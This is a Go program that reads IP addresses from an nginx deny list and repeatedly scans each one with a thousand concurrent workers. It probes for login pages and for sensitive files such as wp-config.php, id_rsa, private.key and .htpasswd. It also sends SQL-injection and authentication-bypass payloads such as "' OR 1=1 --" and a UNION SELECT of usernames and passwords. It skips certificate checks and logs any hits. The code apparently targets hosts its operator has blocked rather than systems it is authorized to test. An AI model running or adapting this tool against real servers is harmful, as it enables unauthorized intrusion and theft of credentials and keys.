package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"fmt"
	"net"
	"net/http"
	"os"
	"os/signal"
	"regexp"
	"sync"
	"syscall"
	"time"
)

const (
	filePath    = "/Users/sin/GolandProjects/awesomeProject/http/deny_ips.conf"
	workerCount = 1000
	timeout     = 5 * time.Second
	outputFile  = "./requests.txt"
)

var commonPaths = []string{
	"/login.php",
	"/admin/login.php",
	"/user/login.php",
	"/index.php",
	"/phpinfo.php",
	"/test.php",
}

var sensitiveFiles = []string{
	"/config.php",
	"/wp-config.php",
	"/database.php",
	"/secret.txt",
	"/id_rsa",
	"/private.key",
	"/admin/.htpasswd",
}

var sqlInjectionPayloads = []string{
	"' OR 1=1 --",
	"' OR 'a'='a",
	"1' UNION SELECT null, username, password FROM users--",
	"1' AND 1=1--",
}

var authInjectionPayloads = []string{
	"' OR 'a'='a",
	"' OR 'x'='x",
}

func extractIPs(filePath string) ([]string, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var ips []string
	re := regexp.MustCompile(`deny\s+([0-9\.]+);`)
	scanner := bufio.NewScanner(file)

	for scanner.Scan() {
		line := scanner.Text()
		matches := re.FindStringSubmatch(line)
		if len(matches) == 2 {
			ips = append(ips, matches[1])
		}
	}
	return ips, scanner.Err()
}

func logRequest(command, response string) {
	go func() {
		file, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0666)
		if err != nil {
			fmt.Printf("❌ 无法写入文件: %v\n", err)
			return
		}
		defer file.Close()

		writer := bufio.NewWriter(file)
		_, err = writer.WriteString(fmt.Sprintf("命令: %s\n响应: %s\n\n", command, response))
		if err != nil {
			fmt.Printf("❌ 无法写入文件: %v\n", err)
		}
		writer.Flush()
	}()
}

// 自定义 HTTP 客户端，打印本地端口和响应头
func NewHttpClientWithPortLogging() *http.Client {
	dialer := &net.Dialer{
		Timeout:   5 * time.Second,
		KeepAlive: 30 * time.Second,
	}

	transport := &http.Transport{
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true}, // 跳过 HTTPS 证书校验
		DisableKeepAlives:   false,
		MaxIdleConns:        1000,
		MaxConnsPerHost:     1000,
		MaxIdleConnsPerHost: 1000,
		IdleConnTimeout:     90 * time.Second,
		DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
			conn, err := dialer.DialContext(ctx, network, addr)
			if err == nil {
				localAddr := conn.LocalAddr().(*net.TCPAddr)
				fmt.Printf("🔌 发起请求，客户端本地端口: %d -> %s\n", localAddr.Port, addr)
			}
			return conn, err
		},
	}

	return &http.Client{
		Timeout:   10 * time.Second,
		Transport: transport,
	}
}

func scanForVulnerabilities(ip string, wg *sync.WaitGroup, sem chan struct{}, client *http.Client) {
	defer wg.Done()
	defer func() { <-sem }()

	for _, path := range commonPaths {
		url := fmt.Sprintf("http://%s%s", ip, path)
		req, err := http.NewRequest("GET", url, nil)
		if err != nil {
			fmt.Printf("[-] 创建请求失败 %s: %v\n", url, err)
			continue
		}
		req.Header.Set("User-Agent", "VulnScanner/1.0")
		resp, err := client.Do(req)
		if err != nil {
			fmt.Printf("[-] 请求失败 %s: %v\n", url, err)
			continue
		}
		defer resp.Body.Close()

		// 打印响应头信息
		fmt.Printf("响应头 (%s): %v\n", url, resp.Header)

		if resp.StatusCode == 200 || resp.StatusCode == 401 || resp.StatusCode == 403 {
			logRequest(url, fmt.Sprintf("响应码: %d", resp.StatusCode))
			fmt.Printf("[+] [%d] %s 疑似敏感页面\n", resp.StatusCode, url)
		}
	}

	for _, payload := range sqlInjectionPayloads {
		for _, path := range commonPaths {
			url := fmt.Sprintf("http://%s%s?param=%s", ip, path, payload)
			req, err := http.NewRequest("GET", url, nil)
			if err != nil {
				fmt.Printf("[-] 创建请求失败 %s: %v\n", url, err)
				continue
			}
			req.Header.Set("User-Agent", "VulnScanner/1.0")
			resp, err := client.Do(req)
			if err != nil {
				fmt.Printf("[-] 请求失败 %s: %v\n", url, err)
				continue
			}
			defer resp.Body.Close()

			// 打印响应头信息
			fmt.Printf("响应头 (%s): %v\n", url, resp.Header)

			if resp.StatusCode == 200 {
				logRequest(url, fmt.Sprintf("SQL注入响应码: %d", resp.StatusCode))
				fmt.Printf("[+] [%d] %s 可能存在 SQL 注入漏洞\n", resp.StatusCode, url)
			}
		}
	}

	for _, path := range sensitiveFiles {
		url := fmt.Sprintf("http://%s%s", ip, path)
		req, err := http.NewRequest("GET", url, nil)
		if err != nil {
			fmt.Printf("[-] 创建请求失败 %s: %v\n", url, err)
			continue
		}
		req.Header.Set("User-Agent", "VulnScanner/1.0")
		resp, err := client.Do(req)
		if err != nil {
			fmt.Printf("[-] 请求失败 %s: %v\n", url, err)
			continue
		}
		defer resp.Body.Close()

		// 打印响应头信息
		fmt.Printf("响应头 (%s): %v\n", url, resp.Header)

		if resp.StatusCode == 200 {
			logRequest(url, fmt.Sprintf("响应码: %d", resp.StatusCode))
			fmt.Printf("[+] [%d] %s 可能暴露敏感文件\n", resp.StatusCode, url)
		}
	}

	for _, payload := range authInjectionPayloads {
		url := fmt.Sprintf("http://%s/login.php?username=%s&password=%s", ip, payload, payload)
		req, err := http.NewRequest("GET", url, nil)
		if err != nil {
			fmt.Printf("[-] 创建请求失败 %s: %v\n", url, err)
			continue
		}
		req.Header.Set("User-Agent", "VulnScanner/1.0")
		resp, err := client.Do(req)
		if err != nil {
			fmt.Printf("[-] 请求失败 %s: %v\n", url, err)
			continue
		}
		defer resp.Body.Close()

		// 打印响应头信息
		fmt.Printf("响应头 (%s): %v\n", url, resp.Header)

		if resp.StatusCode == 200 {
			logRequest(url, fmt.Sprintf("授权注入响应码: %d", resp.StatusCode))
			fmt.Printf("[+] [%d] %s 可能存在授权注入漏洞\n", resp.StatusCode, url)
		}
	}
}

func main() {
	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()

	stop := make(chan os.Signal, 1)
	signal.Notify(stop, syscall.SIGINT, syscall.SIGTERM)

	for {
		select {
		case <-stop:
			fmt.Println("\n🛑 接收到终止信号，退出扫描器。")
			return
		default:
			fmt.Println("🚀 开始新一轮扫描...")

			ips, err := extractIPs(filePath)
			if err != nil {
				fmt.Printf("❌ 读取 IP 文件失败: %v\n", err)
				continue
			}

			if len(ips) == 0 {
				fmt.Println("⚠️ 未提取到任何 IP，请检查 deny_ips.conf 内容")
				continue
			}

			fmt.Printf("✅ 发现 %d 个 IP，开始扫描...\n", len(ips))

			client := NewHttpClientWithPortLogging()

			var wg sync.WaitGroup
			sem := make(chan struct{}, workerCount)

			for _, ip := range ips {
				wg.Add(1)
				sem <- struct{}{}
				go scanForVulnerabilities(ip, &wg, sem, client)
			}

			wg.Wait()
			fmt.Println("✅ 当前轮扫描完成。")
		}

		fmt.Println("🕒 等待下一轮扫描...")
		select {
		case <-ticker.C:
			continue
		case <-stop:
			fmt.Println("\n🛑 接收到终止信号，退出扫描器。")
			return
		}
	}
}
